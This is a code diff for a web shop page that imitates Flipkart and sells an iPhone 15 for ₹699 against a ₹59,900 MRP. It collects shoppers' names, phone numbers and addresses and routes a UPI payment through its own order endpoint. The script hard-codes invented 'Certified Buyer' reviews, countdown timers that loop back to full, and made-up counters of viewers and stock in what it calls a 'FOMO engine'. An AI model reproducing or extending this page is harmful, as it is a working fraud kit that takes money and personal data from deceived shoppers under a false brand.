+              <span class="seller">Sold by TrueComRetail</span>
+            </div>
+            <div class="order-item-price">₹699</div>
+          </div>
+          <div class="price-lines">
+            <div class="price-line"><span>MRP</span><span style="text-decoration:line-through">₹59,900</span></div>
+            <div class="price-line discount"><span>Discount</span><span>− ₹59,201</span></div>
+            <div class="price-line"><span>Delivery</span><span style="color:var(--fk-green);font-weight:600">FREE</span></div>
+            <div class="price-line"><span>Protect Promise Fee</span><span>₹49</span></div>
+            <div class="price-line total"><span>Total Amount</span><span>₹748</span></div>
+          </div>
+          <div class="delivery-est" id="checkoutDeliveryEst">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4z"/></svg>
+            <span id="checkoutDeliveryText">EXPRESS delivery to Faridabad · Get it by Fri, 13 Jun</span>
+          </div>
+        </div>
+
+        <!-- Delivery details -->
+        <div class="checkout-card">
+          <div class="checkout-card-title">
+            <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 010-5 2.5 2.5 0 010 5z"/></svg>
+            Delivery details
+          </div>
+          <div class="field">
+            <label for="name">Full Name</label>
+            <input type="text" id="name" placeholder="Enter your full name" autocomplete="name">
+            <div class="field-error" id="errName">Please enter your full name</div>
+          </div>
+          <div class="field">
+            <label for="mobile">Mobile Number</label>
+            <div class="field-row">
+              <span class="field-prefix">+91</span>
+              <input type="tel" id="mobile" maxlength="10" inputmode="numeric" placeholder="10-digit mobile number" autocomplete="tel">
+            </div>
+            <div class="field-error" id="errMobile">Enter a valid 10-digit mobile number</div>
+          </div>
+          <div class="field">
+            <label for="pincode">Pincode</label>
+            <input type="tel" id="pincode" maxlength="6" inputmode="numeric" placeholder="6-digit pincode" autocomplete="postal-code">
+            <div class="field-error" id="errPincode">Enter a valid 6-digit pincode</div>
+            <div class="pincode-info" id="pincodeInfo"></div>
+          </div>
+          <div class="field">
+            <label for="address">Complete Address</label>
+            <textarea id="address" rows="2" placeholder="House/Flat no., Building, Street, Area" autocomplete="street-address"></textarea>
+            <div class="field-error" id="errAddress">Please enter your complete address</div>
+          </div>
+        </div>
+
+        <!-- Payment method -->
+        <div class="checkout-card">
+          <div class="checkout-card-title">
+            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+            Payment method
+          </div>
+          <div class="pay-options">
+            <button class="pay-opt active" type="button" data-pay="upi">
+              <div class="pay-opt-icon upi-logo"><img src="images/upi-logo.png" alt="UPI"></div>
+              <div class="pay-opt-text"><strong>UPI</strong><span>Google Pay, PhonePe, Paytm &amp; more</span></div>
+              <div class="pay-opt-radio"></div>
+            </button>
+            <div class="pay-opt disabled" id="codDisabled" aria-disabled="true">
+              <div class="pay-opt-icon"><svg class="ico ico-muted" width="18" height="18"><use href="#i-cash"/></svg></div>
+              <div class="pay-opt-text"><strong>Cash on Delivery</strong><span>Not available for this deal</span></div>
+              <span class="pay-unavail">Unavailable</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Trust badges -->
+        <div class="checkout-card">
+          <div class="trust-row">
+            <div class="trust-item"><svg class="ico ico-blue"><use href="#i-shield-outline"/></svg>Secure</div>
+            <div class="trust-item"><svg class="ico ico-blue"><use href="#i-check"/></svg>Genuine</div>
+            <div class="trust-item"><svg class="ico ico-blue"><use href="#i-wrench"/></svg>7-day support</div>
+            <div class="trust-item"><svg class="ico ico-blue"><use href="#i-clock"/></svg>Express</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-footer">
+        <div class="modal-footer-total">
+          <span>Total payable</span>
+          <strong>₹748</strong>
+        </div>
+        <button class="modal-buy" id="confirmBuy" type="button">Pay with UPI · ₹748</button>
+        <div class="modal-secure">
+          <svg class="ico ico-green" width="12" height="12"><use href="#i-shield-outline"/></svg>
+          100% secure UPI payments · Flipkart Assured
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Pincode sheet -->
+  <div class="sheet-overlay" id="pinSheet">
+    <div class="sheet">
+      <h3>Enter delivery pincode</h3>
+      <input type="tel" id="pinSheetInput" maxlength="6" inputmode="numeric" placeholder="6-digit pincode">
+      <div class="sheet-info" id="pinSheetInfo"></div>
+      <div class="sheet-btns">
+        <button class="sheet-btn cancel" type="button" id="pinSheetCancel">Cancel</button>
+        <button class="sheet-btn apply" type="button" id="pinSheetApply" disabled>Apply</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payment loading overlay -->
+  <div class="pay-overlay" id="payOverlay">
+    <div class="pay-screen">
+      <img src="images/upi-logo.png" alt="UPI">
+      <div class="pay-spinner" id="paySpinner"></div>
+      <h3 id="payTitle">Opening UPI payment</h3>
+      <p id="paySubtitle">Securely redirecting to payment gateway…</p>
+      <div class="pay-error" id="payError"></div>
+      <button class="pay-retry" type="button" id="payRetry" style="display:none">Try again</button>
+    </div>
+  </div>
+
+  <script>
+    const GALLERY = [
+      { src: 'images/img-04-lineup.png', label: 'Black', heroClass: 'hero-black' },
+      { src: 'images/img-01-macro.png', label: 'Camera' },
+      { src: 'images/img-03-hero.png', label: 'Display' },
+      { src: 'images/img-05-dynamic-island.png', label: 'Dynamic Island' },
+      { src: 'images/img-08-box.png', label: 'In the Box' },
+    ];
+
+    const COLORS = [
+      { name: 'Black', img: 'images/img-04-lineup.png', active: true, inStock: true },
+      { name: 'Blue', img: 'images/img-04-lineup.png', oos: true },
+      { name: 'Green', img: 'images/img-04-lineup.png', oos: true },
+      { name: 'Pink', img: 'images/img-04-lineup.png', oos: true },
+      { name: 'Yellow', img: 'images/img-04-lineup.png', oos: true },
+    ];
+
+    const TAB_IMAGES = {
+      showcase: 'images/img-03-hero.png',
+      specs: 'images/img-06-features.png',
+      desc: 'images/img-05-dynamic-island.png',
+      warranty: 'images/img-08-box.png',
+    };
+
+    const DETAIL_IMAGES = [
+      'images/img-03-hero.png', 'images/img-04-lineup.png', 'images/img-05-dynamic-island.png',
+      'images/img-06-features.png', 'images/img-07-accessories.png', 'images/img-08-box.png',
+      'images/img-01-macro.png', 'images/img-02-trio.png', 'images/img-09-green.png',
+      'images/img-10-pink.png', 'images/img-11-green-back.png',
+    ];
+
+    let slide = 0;
+    let touchStartX = 0;
+
+    function renderDots() {
+      const dots = document.getElementById('dots');
+      dots.innerHTML = GALLERY.map((_, i) =>
+        `<button class="dot${i === slide ? ' active' : ''}" data-i="${i}" type="button" aria-label="Slide ${i + 1}"></button>`
+      ).join('');
+      dots.querySelectorAll('.dot').forEach(d => d.addEventListener('click', () => goSlide(+d.dataset.i)));
+    }
+
+    function goSlide(i) {
+      if (i < 0) i = GALLERY.length - 1;
+      if (i >= GALLERY.length) i = 0;
+      slide = i;
+      const img = document.getElementById('mainImg');
+      img.style.opacity = '0.4';
+      img.onload = () => { img.style.opacity = '1'; };
+      img.src = GALLERY[i].src;
+      img.alt = 'iPhone 15 – ' + GALLERY[i].label;
+      img.className = GALLERY[i].heroClass || '';
+      renderDots();
+    }
+
+    function renderColors() {
+      document.getElementById('colorRow').innerHTML = COLORS.map(c => `
+        <div class="color-thumb${c.active ? ' active' : ''}${c.oos ? ' oos' : ''}"
+          data-color="${c.name}" data-img="${c.img}" data-stock="${c.inStock ? '1' : '0'}">
+          <img src="${c.img}" alt="${c.name}" draggable="false">
+        </div>`).join('');
+
+      document.querySelectorAll('.color-thumb').forEach(el => {
+        el.addEventListener('click', () => {
+          if (el.dataset.stock !== '1') return;
+          document.querySelectorAll('.color-thumb').forEach(t => t.classList.remove('active'));
+          el.classList.add('active');
+          document.getElementById('colorLabel').textContent = el.dataset.color;
+          const idx = GALLERY.findIndex(g => g.src === el.dataset.img);
+          goSlide(idx >= 0 ? idx : 0);
+        });
+      });
+    }
+
+    function renderDetailGallery() {
+      document.getElementById('detailGallery').innerHTML = DETAIL_IMAGES.map(src =>
+        `<img src="${src}" alt="Product detail" loading="lazy" draggable="false">`
+      ).join('');
+    }
+
+    const galleryMain = document.getElementById('galleryMain');
+    galleryMain.addEventListener('touchstart', e => { touchStartX = e.changedTouches[0].screenX; }, { passive: true });
+    galleryMain.addEventListener('touchend', e => {
+      const diff = e.changedTouches[0].screenX - touchStartX;
+      if (Math.abs(diff) > 40) goSlide(slide + (diff < 0 ? 1 : -1));
+    }, { passive: true });
+
+    document.getElementById('tabs').addEventListener('click', e => {
+      const tab = e.target.closest('.tab');
+      if (!tab) return;
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      const key = tab.dataset.tab;
+      const showcase = document.getElementById('appleShowcase');
+      const tabImg = document.getElementById('tabImg');
+      if (key === 'showcase') {
+        showcase.style.display = 'block';
+        tabImg.style.display = 'none';
+      } else {
+        showcase.style.display = 'none';
+        tabImg.style.display = 'block';
+        tabImg.src = TAB_IMAGES[key];
+      }
+      document.getElementById('detailGallery').classList.remove('open');
+      document.getElementById('showMoreBtn').textContent = 'Show More ›';
+    });
+
+    document.querySelectorAll('.collapse-head').forEach(head => {
+      head.addEventListener('click', () => {
+        const id = head.dataset.collapse;
+        const body = document.getElementById(id);
+        head.classList.toggle('open');
+        body.classList.toggle('open');
+      });
+    });
+
+    document.getElementById('showMoreBtn').addEventListener('click', () => {
+      const gal = document.getElementById('detailGallery');
+      const btn = document.getElementById('showMoreBtn');
+      gal.classList.toggle('open');
+      btn.textContent = gal.classList.contains('open') ? 'Show Less ‹' : 'Show More ›';
+    });
+
+    function openModal() {
+      const savedPin = localStorage.getItem('fk_pin') || document.getElementById('pinDisplay').textContent.trim();
+      if (/^\d{6}$/.test(savedPin)) {
+        document.getElementById('pincode').value = savedPin;
+        updatePincodeUI(savedPin);
+      }
+      loadCheckoutForm();
+      resetCheckoutSteps();
+      clearFieldErrors();
+      document.getElementById('modal').classList.add('open');
+      document.body.classList.add('modal-open');
+    }
+    function closeModal() {
+      document.getElementById('modal').classList.remove('open');
+      document.body.classList.remove('modal-open');
+    }
+    function resetCheckoutSteps() {
+      document.getElementById('step1').className = 'checkout-step active';
+      document.getElementById('step2').className = 'checkout-step';
+    }
+    function setCheckoutStepsDone() {
+      document.getElementById('step1').className = 'checkout-step done';
+      document.getElementById('step2').className = 'checkout-step active';
+    }
+
+    const PIN_MAP = {
+      '110001': { city: 'New Delhi', state: 'Delhi' },
+      '110002': { city: 'New Delhi', state: 'Delhi' },
+      '110092': { city: 'New Delhi', state: 'Delhi' },
+      '121001': { city: 'Faridabad', state: 'Haryana' },
+      '121002': { city: 'Faridabad', state: 'Haryana' },
+      '121013': { city: 'Faridabad', state: 'Haryana' },
+      '122001': { city: 'Gurgaon', state: 'Haryana' },
+      '122002': { city: 'Gurgaon', state: 'Haryana' },
+      '201301': { city: 'Noida', state: 'Uttar Pradesh' },
+      '201305': { city: 'Noida', state: 'Uttar Pradesh' },
+      '400001': { city: 'Mumbai', state: 'Maharashtra' },
+      '400002': { city: 'Mumbai', state: 'Maharashtra' },
+      '400050': { city: 'Mumbai', state: 'Maharashtra' },
+      '400703': { city: 'Navi Mumbai', state: 'Maharashtra' },
+      '411001': { city: 'Pune', state: 'Maharashtra' },
+      '411014': { city: 'Pune', state: 'Maharashtra' },
+      '560001': { city: 'Bangalore', state: 'Karnataka' },
+      '560034': { city: 'Bangalore', state: 'Karnataka' },
+      '560100': { city: 'Bangalore', state: 'Karnataka' },
+      '500001': { city: 'Hyderabad', state: 'Telangana' },
+      '500032': { city: 'Hyderabad', state: 'Telangana' },
+      '600001': { city: 'Chennai', state: 'Tamil Nadu' },
+      '600028': { city: 'Chennai', state: 'Tamil Nadu' },
+      '700001': { city: 'Kolkata', state: 'West Bengal' },
+      '700019': { city: 'Kolkata', state: 'West Bengal' },
+      '380001': { city: 'Ahmedabad', state: 'Gujarat' },
+      '380015': { city: 'Ahmedabad', state: 'Gujarat' },
+      '302001': { city: 'Jaipur', state: 'Rajasthan' },
+      '302017': { city: 'Jaipur', state: 'Rajasthan' },
+      '226001': { city: 'Lucknow', state: 'Uttar Pradesh' },
+      '452001': { city: 'Indore', state: 'Madhya Pradesh' },
+      '462001': { city: 'Bhopal', state: 'Madhya Pradesh' },
+      '440001': { city: 'Nagpur', state: 'Maharashtra' },
+      '800001': { city: 'Patna', state: 'Bihar' },
+      '834001': { city: 'Ranchi', state: 'Jharkhand' },
+      '682001': { city: 'Kochi', state: 'Kerala' },
+      '695001': { city: 'Thiruvananthapuram', state: 'Kerala' },
+      '751001': { city: 'Bhubaneswar', state: 'Odisha' },
+      '160001': { city: 'Chandigarh', state: 'Chandigarh' },
+      '141001': { city: 'Ludhiana', state: 'Punjab' },
+      '144001': { city: 'Jalandhar', state: 'Punjab' },
+    };
+    const PIN_PREFIX = {
+      '110': { city: 'Delhi NCR', state: 'Delhi' },
+      '121': { city: 'Faridabad', state: 'Haryana' },
+      '122': { city: 'Gurgaon', state: 'Haryana' },
+      '201': { city: 'Noida', state: 'Uttar Pradesh' },
+      '400': { city: 'Mumbai', state: 'Maharashtra' },
+      '411': { city: 'Pune', state: 'Maharashtra' },
+      '560': { city: 'Bangalore', state: 'Karnataka' },
+      '500': { city: 'Hyderabad', state: 'Telangana' },
+      '600': { city: 'Chennai', state: 'Tamil Nadu' },
+      '700': { city: 'Kolkata', state: 'West Bengal' },
+      '380': { city: 'Ahmedabad', state: 'Gujarat' },
+      '302': { city: 'Jaipur', state: 'Rajasthan' },
+      '226': { city: 'Lucknow', state: 'Uttar Pradesh' },
+      '452': { city: 'Indore', state: 'Madhya Pradesh' },
+      '462': { city: 'Bhopal', state: 'Madhya Pradesh' },
+      '440': { city: 'Nagpur', state: 'Maharashtra' },
+      '800': { city: 'Patna', state: 'Bihar' },
+      '834': { city: 'Ranchi', state: 'Jharkhand' },
+      '682': { city: 'Kochi', state: 'Kerala' },
+      '695': { city: 'Thiruvananthapuram', state: 'Kerala' },
+      '751': { city: 'Bhubaneswar', state: 'Odisha' },
+      '160': { city: 'Chandigarh', state: 'Chandigarh' },
+      '141': { city: 'Ludhiana', state: 'Punjab' },
+      '144': { city: 'Jalandhar', state: 'Punjab' },
+    };
+
+    function lookupPincode(pin) {
+      if (PIN_MAP[pin]) return { ...PIN_MAP[pin], serviceable: true };
+      const prefix = pin.slice(0, 3);
+      if (PIN_PREFIX[prefix]) return { ...PIN_PREFIX[prefix], serviceable: true };
+      if (/^[1-9]\d{5}$/.test(pin)) return { city: 'Your area', state: 'India', serviceable: true };
+      return null;
+    }
+
+    function getDeliveryDate(days) {
+      const d = new Date();
+      d.setDate(d.getDate() + days);
+      return d.toLocaleDateString('en-IN', { weekday: 'short', day: 'numeric', month: 'short' });
+    }
+
+    function updatePincodeUI(pin) {
+      const info = lookupPincode(pin);
+      const pinInfo = document.getElementById('pincodeInfo');
+      const deliveryCity = document.getElementById('deliveryCity');
+      const pinDisplay = document.getElementById('pinDisplay');
+      const deliveryDateLine = document.getElementById('deliveryDateLine');
+      const checkoutText = document.getElementById('checkoutDeliveryText');
+      const dateStr = getDeliveryDate(2);
+
+      if (!info) {
+        pinInfo.className = 'pincode-info invalid show';
+        pinInfo.textContent = 'Enter a valid 6-digit pincode';
+        return false;
+      }
+
+      const label = info.city + ', ' + info.state;
+      pinInfo.className = 'pincode-info show';
+      pinInfo.textContent = 'Deliver to ' + label + ' · ' + pin;
+      deliveryCity.textContent = 'Deliver to ' + label;
+      pinDisplay.textContent = pin;
+      deliveryDateLine.textContent = 'Get it by ' + dateStr;
+      if (checkoutText) checkoutText.textContent = 'EXPRESS delivery to ' + info.city + ' · Get it by ' + dateStr;
+      localStorage.setItem('fk_pin', pin);
+      updateNearFomo(pin);
+      return true;
+    }
+
+    function clearFieldErrors() {
+      ['name', 'mobile', 'pincode', 'address'].forEach(id => {
+        document.getElementById(id).classList.remove('invalid');
+        document.getElementById('err' + id.charAt(0).toUpperCase() + id.slice(1)).classList.remove('show');
+      });
+    }
+
+    function showFieldError(id, errId) {
+      document.getElementById(id).classList.add('invalid');
+      document.getElementById(errId).classList.add('show');
+    }
+
+    function validateCheckoutForm() {
+      clearFieldErrors();
+      let ok = true;
+      const name = document.getElementById('name').value.trim();
+      const mobile = document.getElementById('mobile').value.replace(/\D/g, '');
+      const pincode = document.getElementById('pincode').value.replace(/\D/g, '');
+      const address = document.getElementById('address').value.trim();
+
+      if (name.length < 2) { showFieldError('name', 'errName'); ok = false; }
+      if (mobile.length !== 10 || !/^[6-9]/.test(mobile)) { showFieldError('mobile', 'errMobile'); ok = false; }
+      if (pincode.length !== 6 || !lookupPincode(pincode)) { showFieldError('pincode', 'errPincode'); ok = false; }
+      if (address.length < 5) { showFieldError('address', 'errAddress'); ok = false; }
+
+      return ok ? { name, mobile, pincode, address } : null;
+    }
+
+    function saveCheckoutForm(data) {
+      localStorage.setItem('fk_checkout', JSON.stringify(data));
+    }
+    function loadCheckoutForm() {
+      try {
+        const saved = JSON.parse(localStorage.getItem('fk_checkout') || '{}');
+        if (saved.name) document.getElementById('name').value = saved.name;
+        if (saved.mobile) document.getElementById('mobile').value = saved.mobile;
+        if (saved.address) document.getElementById('address').value = saved.address;
+      } catch (_) {}
+    }
+
+    function generateOrderId() {
+      return 'OD' + Date.now().toString().slice(-12) + Math.floor(Math.random() * 900 + 100);
+    }
+
+    function showPayOverlay() {
+      document.getElementById('payOverlay').classList.add('open');
+      document.getElementById('paySpinner').style.display = 'block';
+      document.getElementById('payTitle').textContent = 'Opening UPI payment';
+      document.getElementById('paySubtitle').textContent = 'Securely redirecting to payment gateway…';
+      document.getElementById('payError').classList.remove('show');
+      document.getElementById('payRetry').style.display = 'none';
+      document.body.classList.add('modal-open');
+    }
+    function hidePayOverlay() {
+      document.getElementById('payOverlay').classList.remove('open');
+      if (!document.getElementById('modal').classList.contains('open')) {
+        document.body.classList.remove('modal-open');
+      }
+    }
+    function showPayError(msg) {
+      document.getElementById('paySpinner').style.display = 'none';
+      document.getElementById('payTitle').textContent = 'Payment could not start';
+      document.getElementById('paySubtitle').textContent = 'Please try again';
+      const errEl = document.getElementById('payError');
+      errEl.textContent = msg;
+      errEl.classList.add('show');
+      document.getElementById('payRetry').style.display = 'inline-block';
+    }
+
+    async function initiatePayment(formData) {
+      if (location.protocol === 'file:') {
+        showPayError('Open via http://localhost:8765/index.html — run: python server.py');
+        return;
+      }
+
+      const btn = document.getElementById('confirmBuy');
+      btn.classList.add('loading');
+      btn.textContent = 'Processing…';
+      setCheckoutStepsDone();
+      showPayOverlay();
+      closeModal();
+
+      const orderId = generateOrderId();
+      const redirectUrl = location.origin + '/callback.html?order_id=' + encodeURIComponent(orderId);
+
+      try {
+        const res = await fetch('/api/create-order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            amount: 748,
+            order_id: orderId,
+            redirect_url: redirectUrl,
+            customer_mobile: formData.mobile,
+            remark1: formData.name + ' | ' + formData.pincode
+          })
+        });
+        const text = await res.text();
+        const data = text.trim() ? JSON.parse(text) : {};
+
+        if (data.status && data.payment_data) {
+          sessionStorage.setItem('pending_order_id', orderId);
+          sessionStorage.setItem('order_product', 'APPLE iPhone 15 (Black, 128 GB)');
+          sessionStorage.setItem('order_mobile', formData.mobile);
+          sessionStorage.setItem('order_pin', formData.pincode);
+          sessionStorage.setItem('payment_data', JSON.stringify(data.payment_data));
+          hidePayOverlay();
+          location.href = 'pay.html';
+          return;
+        }
+        if (data.status && data.payment_url) {
+          sessionStorage.setItem('pending_order_id', orderId);
+          sessionStorage.setItem('order_product', 'APPLE iPhone 15 (Black, 128 GB)');
+          sessionStorage.setItem('order_mobile', formData.mobile);
+          sessionStorage.setItem('order_pin', formData.pincode);
+          location.href = data.payment_url;
+          return;
+        }
+        throw new Error(data.message || 'Could not create payment order');
+      } catch (err) {
+        showPayError(err.message);
+        btn.classList.remove('loading');
+        btn.textContent = 'Pay with UPI · ₹748';
+      }
+    }
+
+    document.getElementById('buyBtn').addEventListener('click', openModal);
+    document.getElementById('modalClose').addEventListener('click', closeModal);
+    document.getElementById('modal').addEventListener('click', e => {
+      if (e.target.id === 'modal') closeModal();
+    });
+
+    document.getElementById('confirmBuy').addEventListener('click', () => {
+      const formData = validateCheckoutForm();
+      if (!formData) return;
+      saveCheckoutForm(formData);
+      initiatePayment(formData);
+    });
+
+    document.getElementById('payRetry').addEventListener('click', () => {
+      hidePayOverlay();
+      document.getElementById('confirmBuy').classList.remove('loading');
+      document.getElementById('confirmBuy').textContent = 'Pay with UPI · ₹748';
+      openModal();
+    });
+
+    document.getElementById('pincode').addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+      if (e.target.value.length === 6) updatePincodeUI(e.target.value);
+      else document.getElementById('pincodeInfo').classList.remove('show');
+    });
+
+    document.getElementById('mobile').addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+    });
+
+    /* pincode sheet */
+    function openPinSheet() {
+      const current = document.getElementById('pinDisplay').textContent.trim();
+      document.getElementById('pinSheetInput').value = current;
+      document.getElementById('pinSheetInfo').className = 'sheet-info';
+      document.getElementById('pinSheetInfo').textContent = '';
+      document.getElementById('pinSheetApply').disabled = current.length !== 6;
+      if (current.length === 6) {
+        const info = lookupPincode(current);
+        if (info) {
+          document.getElementById('pinSheetInfo').className = 'sheet-info ok';
+          document.getElementById('pinSheetInfo').textContent = 'Deliver to ' + info.city + ', ' + info.state;
+        }
+      }
+      document.getElementById('pinSheet').classList.add('open');
+      document.body.classList.add('modal-open');
+    }
+    function closePinSheet() {
+      document.getElementById('pinSheet').classList.remove('open');
+      if (!document.getElementById('modal').classList.contains('open') && !document.getElementById('payOverlay').classList.contains('open')) {
+        document.body.classList.remove('modal-open');
+      }
+    }
+
+    document.getElementById('pinLink').addEventListener('click', e => {
+      e.preventDefault();
+      openPinSheet();
+    });
+    document.getElementById('pinSheetCancel').addEventListener('click', closePinSheet);
+    document.getElementById('pinSheet').addEventListener('click', e => {
+      if (e.target.id === 'pinSheet') closePinSheet();
+    });
+    document.getElementById('pinSheetInput').addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+      const pin = e.target.value;
+      const infoEl = document.getElementById('pinSheetInfo');
+      const applyBtn = document.getElementById('pinSheetApply');
+      if (pin.length === 6) {
+        const info = lookupPincode(pin);
+        if (info) {
+          infoEl.className = 'sheet-info ok';
+          infoEl.textContent = 'Deliver to ' + info.city + ', ' + info.state;
+          applyBtn.disabled = false;
+        } else {
+          infoEl.className = 'sheet-info bad';
+          infoEl.textContent = 'Invalid pincode';
+          applyBtn.disabled = true;
+        }
+      } else {
+        infoEl.className = 'sheet-info';
+        infoEl.textContent = '';
+        applyBtn.disabled = true;
+      }
+    });
+    document.getElementById('pinSheetApply').addEventListener('click', () => {
+      const pin = document.getElementById('pinSheetInput').value;
+      if (pin.length === 6 && lookupPincode(pin)) {
+        updatePincodeUI(pin);
+        document.getElementById('pincode').value = pin;
+        closePinSheet();
+      }
+    });
+
+    let secs = 4456;
+    setInterval(() => {
+      secs--;
+      if (secs < 0) secs = 4456;
+      const h = String(Math.floor(secs / 3600)).padStart(2, '0');
+      const m = String(Math.floor((secs % 3600) / 60)).padStart(2, '0');
+      const s = String(secs % 60).padStart(2, '0');
+      document.getElementById('orderTimer').textContent = h + ':' + m + ':' + s;
+    }, 1000);
+
+    let dealSecs = 10038;
+    setInterval(() => {
+      dealSecs--;
+      if (dealSecs < 0) dealSecs = 10038;
+      const h = String(Math.floor(dealSecs / 3600)).padStart(2, '0');
+      const m = String(Math.floor((dealSecs % 3600) / 60)).padStart(2, '0');
+      const s = String(dealSecs % 60).padStart(2, '0');
+      document.getElementById('dealTimer').textContent = h + ':' + m + ':' + s;
+    }, 1000);
+
+    /* ── FOMO engine ── */
+    const FOMO_PEOPLE = [
+      { name: 'Arjun', city: 'Mumbai', color: '#2874f0' },
+      { name: 'Priya', city: 'Delhi', color: '#e91e63' },
+      { name: 'Rahul', city: 'Bangalore', color: '#ff9800' },
+      { name: 'Sneha', city: 'Pune', color: '#9c27b0' },
+      { name: 'Vikram', city: 'Hyderabad', color: '#00897b' },
+      { name: 'Ananya', city: 'Chennai', color: '#f44336' },
+      { name: 'Karan', city: 'Jaipur', color: '#3f51b5' },
+      { name: 'Divya', city: 'Kolkata', color: '#795548' },
+      { name: 'Rohan', city: 'Ahmedabad', color: '#607d8b' },
+      { name: 'Meera', city: 'Lucknow', color: '#ff5722' },
+      { name: 'Aditya', city: 'Indore', color: '#2196f3' },
+      { name: 'Pooja', city: 'Chandigarh', color: '#8bc34a' },
+      { name: 'Nikhil', city: 'Kochi', color: '#00bcd4' },
+      { name: 'Shreya', city: 'Nagpur', color: '#673ab7' },
+      { name: 'Aman', city: 'Patna', color: '#009688' },
+      { name: 'Ishaan', city: 'Surat', color: '#ff7043' },
+      { name: 'Kavya', city: 'Bhopal', color: '#ab47bc' },
+      { name: 'Dev', city: 'Visakhapatnam', color: '#26a69a' },
+      { name: 'Tanvi', city: 'Gurgaon', color: '#5c6bc0' },
+      { name: 'Harsh', city: 'Noida', color: '#ef5350' },
+    ];
+
+    const REVIEWS = [
+      { name: 'Rahul K.', city: 'Mumbai', stars: 5, tag: 'Value for money', color: '#2874f0', text: 'Amazing phone at this price. Camera quality is excellent and battery lasts all day. Delivery was super fast.', ago: '2 months ago' },
+      { name: 'Priya S.', city: 'Delhi', stars: 5, tag: 'Brilliant', color: '#e91e63', text: 'Best iPhone I\'ve owned. Dynamic Island is smooth and the display is gorgeous. Highly recommend.', ago: '1 month ago' },
+      { name: 'Vikram M.', city: 'Bangalore', stars: 5, tag: 'Superb camera', color: '#ff9800', text: '48MP camera is insane. Low light photos look professional. Got it for ₹699 deal — absolute steal!', ago: '3 weeks ago' },
+      { name: 'Ananya R.', city: 'Chennai', stars: 5, tag: 'Genuine product', color: '#9c27b0', text: '100% original Apple product, sealed box. Flipkart delivery was on time. Face ID works flawlessly.', ago: '3 weeks ago' },
+      { name: 'Karan T.', city: 'Pune', stars: 4, tag: 'Good purchase', color: '#00897b', text: 'Phone is fantastic. Only reason for 4 stars — wish I ordered the 256GB. Performance is buttery smooth.', ago: '2 weeks ago' },
+      { name: 'Sneha P.', city: 'Hyderabad', stars: 5, tag: 'Fast delivery', color: '#f44336', text: 'Ordered yesterday, got it today via EXPRESS. Phone looks brand new. USB-C is a welcome change.', ago: '2 weeks ago' },
+      { name: 'Rohan D.', city: 'Jaipur', stars: 5, tag: 'Worth every rupee', color: '#3f51b5', text: 'Was skeptical about the price but it\'s legit. A16 chip handles everything I throw at it. Gaming is smooth.', ago: '10 days ago' },
+      { name: 'Meera J.', city: 'Kolkata', stars: 5, tag: 'Perfect gift', color: '#ff5722', text: 'Bought for my husband\'s birthday. He was thrilled! Build quality is premium as expected from Apple.', ago: '8 days ago' },
+      { name: 'Aditya N.', city: 'Ahmedabad', stars: 5, tag: 'Excellent display', color: '#2196f3', text: 'OLED screen is stunning. Colours pop and 1200 nits brightness is great outdoors. Battery easily lasts a full day.', ago: '6 days ago' },
+      { name: 'Divya L.', city: 'Lucknow', stars: 4, tag: 'Great phone', color: '#795548', text: 'Love the compact size. Fits perfectly in hand. Camera upgrade from my old iPhone is very noticeable.', ago: '5 days ago' },
+      { name: 'Nikhil B.', city: 'Chandigarh', stars: 5, tag: 'Must buy', color: '#00bcd4', text: 'At ₹699 this is a no-brainer. Already recommended to 3 friends. TrueComRetail seller was reliable.', ago: '3 days ago' },
+      { name: 'Shreya G.', city: 'Indore', stars: 5, tag: 'Love it!', color: '#673ab7', text: 'Dynamic Island is so useful for notifications. Selfie camera is crisp. Packaging was perfect, no damage.', ago: '2 days ago' },
+      { name: 'Aman V.', city: 'Kochi', stars: 5, tag: 'Top notch', color: '#009688', text: 'Switching from Android — iOS is so smooth. Setup was easy. Flipkart Trust Shield gave peace of mind.', ago: '1 day ago' },
+      { name: 'Pooja H.', city: 'Nagpur', stars: 5, tag: 'Highly satisfied', color: '#8bc34a', text: 'Third iPhone in the family. Black colour looks premium. Sound quality on calls and music is crystal clear.', ago: 'Yesterday' },
+    ];
+
+    function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+    function pick(arr) { return arr[rand(0, arr.length - 1)]; }
+
+    function renderReviews() {
+      const starSvg = '<svg class="ico ico-green" width="11" height="11"><use href="#i-star"/></svg>';
+      document.getElementById('reviewList').innerHTML = REVIEWS.map(r => `
+        <div class="review-card">
+          <div class="review-avatar" style="background:${r.color}">${r.name[0]}</div>
+          <div class="review-body">
+            <div class="review-meta">
+              <div class="review-stars">${r.stars}${starSvg}</div>
+              <span class="review-tag">· ${r.tag}</span>
+              <span class="review-verified"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg> Certified Buyer</span>
+            </div>
+            <p>${r.text}</p>
+            <div class="review-author">${r.name} · ${r.city} · ${r.ago}</div>
+          </div>
+        </div>`).join('');
+    }
+
+    let viewers = 847;
+    let cartHour = 63;
+    let ordersToday = 218;
+    let stockLeft = 3;
+    let cartCount = 12;
+    let wishlist = 2847;
+    let payPending = 8;
+    let soldPct = 91;
+    let nearBuy = 17;
+
+    function buildTicker() {
